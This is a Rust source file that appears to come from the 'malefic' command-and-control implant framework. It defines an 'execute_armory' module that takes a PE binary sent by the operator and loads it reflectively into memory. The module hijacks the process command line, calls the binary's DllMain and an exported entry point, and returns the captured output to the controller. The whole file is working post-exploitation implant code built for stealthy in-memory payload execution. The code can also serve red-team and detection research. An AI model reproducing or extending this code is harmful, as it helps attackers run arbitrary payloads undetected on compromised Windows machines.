use core::ffi::c_void;
use std::ptr::{null_mut};
use crate::{check_request, Module, Result, TaskResult};
use malefic_helper::common::format_cmdline;
use malefic_proto::proto::modulepb::BinaryResponse;
use malefic_proto::proto::implantpb::spite::Body;
use async_trait::async_trait;
use malefic_helper::win::kit::pe::{hijack_commandline, load_pe};
use malefic_helper::win::types::DllMain;
use malefic_helper::win::kit::func::get_func_addr;
use malefic_helper::win::kit::MaleficModule;
use malefic_trait::module_impl;
use async_std::channel::{Receiver, Sender};
use async_std::channel::unbounded as channel;
use async_std::sync::{Arc, Mutex};
use malefic_helper::to_error;

lazy_static::lazy_static! {
    static ref ARMORY_CHANNEL: Arc<Mutex<(Sender<String>, Receiver<String>)>> = {
        let (sender, receiver) = channel(); // 创建通道，缓冲区大小为100
        Arc::new(Mutex::new((sender, receiver)))
    };
}

const SUCCESS: usize = 0;
type ArmoryCallback = extern "C" fn(*const c_void, usize) -> usize;
type ArmoryFunc = extern "C" fn(*const c_void, usize, ArmoryCallback) -> usize;


pub extern "C" fn armory_callback(data: *const c_void, data_len: usize) -> usize {
    let channel = ARMORY_CHANNEL.clone(); 
    let final_data;
    if data_len > 0 && !data.is_null() {
        let out_bytes: &[u8] = unsafe {
            core::slice::from_raw_parts(data as *const u8, data_len)
        };
        final_data = String::from_utf8(out_bytes.to_vec()).unwrap_or_default();
    } else {
        final_data = "Received null data or zero length.".to_string();
    }
    async_std::task::block_on(async {
        let channel = channel.lock().await;
        let _ = channel.0.send(final_data).await; // 发送消息
    });
    SUCCESS
}

pub struct ExecuteArmory {}

#[async_trait]
#[module_impl("execute_armory")]
impl Module for ExecuteArmory {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let name = request.name + "\x00";
        let entrypoint = request.entry_point;
        let bin = request.bin;
        let need_output = request.output;
        let mut ret: Vec<u8> = Vec::new();
        let par = if request.args.is_empty() {
            None
        } else {
            Some(format_cmdline(request.process_name, request.args))
        };
        unsafe {
            let armory = load_pe(bin, None, None) as *const MaleficModule;
            if armory.is_null() {
                return to_error!(Err("Armory load failed, Failed to load PE file".to_string()));
            }
            hijack_commandline(&par);
            let armory_entrypoint = get_func_addr((*armory).new_module as _, entrypoint);
            if armory_entrypoint.is_null() {
                return to_error!(Err("Failed to get entrypoint function address".to_string()));
            }
            
            let args = par.unwrap_or_default() + "\x00";
            let _ = std::mem::transmute::<usize, DllMain>((*armory).entry_point as _)((*armory).new_module as _, 1, null_mut());
            let _ = std::mem::transmute::<usize, ArmoryFunc>(armory_entrypoint as _)(args.as_ptr() as _, args.len(), armory_callback);
            let receiver = ARMORY_CHANNEL.clone();
            let result = async_std::task::block_on(async {
            let receiver = receiver.lock().await;
            let data = receiver.1.recv().await;
            ret = data.unwrap().as_bytes().to_vec();
            malefic_helper::win::kit::pe::unload_pe(armory as _);
            });
        }

        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
            status: 0,
            message: Vec::new(),
            data: ret,
            err: "".to_string(),
        })))
    }
}